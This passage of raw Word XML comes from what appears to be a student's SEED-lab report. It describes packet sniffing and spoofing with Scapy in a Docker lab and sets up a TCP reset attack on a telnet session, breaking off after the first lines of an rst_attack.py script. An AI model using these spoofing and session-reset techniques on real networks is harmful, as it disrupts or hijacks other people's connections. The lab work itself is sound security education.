        <w:t xml:space="preserve">Sniffing: The attacker </w:t>
      </w:r>
      <w:r w:rsidR="004006EE" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>sniffs</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the ping packet </w:t>
      </w:r>
      <w:r w:rsidR="004006EE" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>sent</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> from Host A using the scrappy python script</w:t>
      </w:r>
      <w:r w:rsidR="004006EE" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> with the function sniff(). </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AF8B873" w14:textId="3890066F" w:rsidR="004006EE" w:rsidRPr="00C2328F" w:rsidRDefault="004006EE" w:rsidP="001D0661">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Spoofing: The attacker spoofs the header of packet to the IP 3.9.6.4 and set the destination IP to host A.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E54AC2E" w14:textId="6FE66C61" w:rsidR="004006EE" w:rsidRPr="00C2328F" w:rsidRDefault="004006EE" w:rsidP="001D0661">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Delivery: the script then sends the packets to host A via Scapy’s send() function.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25141C7F" w14:textId="77777777" w:rsidR="00A81C71" w:rsidRPr="00C2328F" w:rsidRDefault="00A81C71" w:rsidP="00A81C71">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4CCFC6DB" w14:textId="4F3BA0AF" w:rsidR="000A5841" w:rsidRPr="00C2328F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Section 4: TCP Session Reset and Hijacking Attacks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A0C9008" w14:textId="6F0D9BF4" w:rsidR="000A5841" w:rsidRPr="00C2328F" w:rsidRDefault="004006EE" w:rsidP="004006EE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Write Linux commands to show your attacker’s network interface name (unique network id) and ids for seed-attacker, Host A, Host B, Host C.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55DDE8B9" w14:textId="4EEEA597" w:rsidR="004006EE" w:rsidRPr="00C2328F" w:rsidRDefault="00C77F37" w:rsidP="004006EE">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">We do the same setup as the start of section 3 but this time we unzip the file </w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>labsetup-tcp.zip</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> instead. You want to ls to the Labsetup-tcp folder then run the lab with </w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>docker-compose up</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D7B7648" w14:textId="202FBAE7" w:rsidR="00416C1F" w:rsidRPr="00C2328F" w:rsidRDefault="00416C1F" w:rsidP="004006EE">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6221E172" wp14:editId="6941C917">
            <wp:extent cx="5486400" cy="3382645"/>
            <wp:effectExtent l="0" t="0" r="0" b="8255"/>
            <wp:docPr id="15265298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29868" name="Picture 1" descr="A screenshot of a computer&#10;&#10;AI-generated content may be incorrect."/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId21"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="3382645"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AB2310B" w14:textId="112CEED5" w:rsidR="004006EE" w:rsidRPr="00C2328F" w:rsidRDefault="00416C1F" w:rsidP="004006EE">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Fig14: Lab setup correctly</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5738002C" w14:textId="3FD1B8EC" w:rsidR="00416C1F" w:rsidRPr="00C2328F" w:rsidRDefault="00416C1F" w:rsidP="004006EE">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B2EAD23" w14:textId="3E24CEB2" w:rsidR="00416C1F" w:rsidRPr="00C2328F" w:rsidRDefault="00416C1F" w:rsidP="004006EE">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">In your host terminal run docker </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ps</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to get all the container ID and their names.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="118BB4FB" w14:textId="1FE03FD8" w:rsidR="00416C1F" w:rsidRPr="00C2328F" w:rsidRDefault="00416C1F" w:rsidP="004006EE">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Open a terminal and type </w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>docker exec -it seed-attacker bash</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to enter attacker terminal.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4368458A" w14:textId="71406B51" w:rsidR="00416C1F" w:rsidRPr="00C2328F" w:rsidRDefault="00416C1F" w:rsidP="004006EE">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">And type </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a command to see the attacker information.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DEE8E6C" w14:textId="3C5B72E1" w:rsidR="00416C1F" w:rsidRPr="00C2328F" w:rsidRDefault="00642ED1" w:rsidP="004006EE">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1B52F177" wp14:editId="6D8EEEBC">
            <wp:extent cx="5486400" cy="995680"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="18602366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36609" name="Picture 1" descr="A screenshot of a computer&#10;&#10;AI-generated content may be incorrect."/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId22"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="995680"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="62E511D0" w14:textId="4C7EC9CE" w:rsidR="00642ED1" w:rsidRPr="00C2328F" w:rsidRDefault="00416C1F" w:rsidP="004006EE">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Fig15: </w:t>
      </w:r>
      <w:r w:rsidR="00642ED1" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>All container names</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="687E48DC" w14:textId="2A535630" w:rsidR="00642ED1" w:rsidRPr="00C2328F" w:rsidRDefault="00642ED1" w:rsidP="004006EE">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5A1E2CF4" wp14:editId="7D9125CA">
            <wp:extent cx="5486400" cy="2595245"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="17431602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60216" name="Picture 1" descr="A screenshot of a computer&#10;&#10;AI-generated content may be incorrect."/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId23"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="2595245"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="42715271" w14:textId="1C3174A1" w:rsidR="00642ED1" w:rsidRPr="00C2328F" w:rsidRDefault="00642ED1" w:rsidP="004006EE">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Fig16: Attacker terminal output</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74C47815" w14:textId="7860CE9F" w:rsidR="00416C1F" w:rsidRPr="00C2328F" w:rsidRDefault="00642ED1" w:rsidP="004006EE">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">As you can see from figure15 we can see the container name and from figure16 since we know from the assignment detail pdf that the IP address for the attack is 10.9.0.1 which match with block 4. This means the interface name is br-88cd79cb4c2d and MAC address is </w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>02:42:21:18:ff:09</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17B1EFFE" w14:textId="46152AA0" w:rsidR="004006EE" w:rsidRPr="00C2328F" w:rsidRDefault="004006EE" w:rsidP="004006EE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Write Python program with Scapy to terminate the telnet session between Host A and Host B.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BDAB285" w14:textId="336334C3" w:rsidR="00B40568" w:rsidRPr="00C2328F" w:rsidRDefault="00B40568" w:rsidP="00B40568">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">First create the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Scappy</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Python script file inside the attacker terminal: </w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>nano rst_attack.py</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1710692B" w14:textId="2BF4797A" w:rsidR="00B40568" w:rsidRPr="00C2328F" w:rsidRDefault="00B40568" w:rsidP="00B40568">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Then paste the code and save + exit after:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69EEA2EF" w14:textId="77777777" w:rsidR="0075765F" w:rsidRPr="00C2328F" w:rsidRDefault="0075765F" w:rsidP="0075765F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>scapy.all</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> import *</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02EDA15D" w14:textId="77777777" w:rsidR="0075765F" w:rsidRPr="00C2328F" w:rsidRDefault="0075765F" w:rsidP="0075765F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="71542DE5" w14:textId="77777777" w:rsidR="0075765F" w:rsidRPr="00C2328F" w:rsidRDefault="0075765F" w:rsidP="0075765F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"># </w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>✅</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Correct interface used by attacker</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4571A47A" w14:textId="77777777" w:rsidR="0075765F" w:rsidRPr="00C2328F" w:rsidRDefault="0075765F" w:rsidP="0075765F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>IFACE = "br-88cd79cb4c2d"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33BFB7A9" w14:textId="77777777" w:rsidR="0075765F" w:rsidRPr="00C2328F" w:rsidRDefault="0075765F" w:rsidP="0075765F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5CF591FA" w14:textId="77777777" w:rsidR="0075765F" w:rsidRPr="00C2328F" w:rsidRDefault="0075765F" w:rsidP="0075765F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>VICTIM_A = "10.9.0.5"</w:t>
      </w:r>
    </w:p>
